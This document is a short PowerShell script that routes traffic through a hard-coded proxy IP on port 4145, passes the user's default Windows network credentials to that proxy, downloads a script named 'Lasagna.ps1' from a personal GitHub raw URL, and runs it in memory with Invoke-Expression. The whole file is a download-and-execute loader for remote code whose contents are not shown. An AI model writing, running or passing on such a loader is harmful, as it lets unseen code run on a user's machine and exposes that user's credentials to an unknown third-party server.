# Set the proxy server information (replace with your proxy server details)
$proxyServer = "98.188.47.132:4145"

# Set the URL of the PowerShell script you want to run
$scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"

# Create a proxy object with credentials
$proxy = New-Object System.Net.WebProxy
$proxy.Address = $proxyServer

# Set the proxy settings for the current session
[system.net.webrequest]::defaultwebproxy = $proxy
[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Download the script content
$webClient = New-Object System.Net.WebClient
$webClient.Proxy = $proxy
$scriptContent = $webClient.DownloadString($scriptURL)

# Run the downloaded script
Invoke-Expression -Command $scriptContent

# Remove the proxy settings to avoid affecting other PowerShell sessions
[system.net.webrequest]::defaultwebproxy = $null
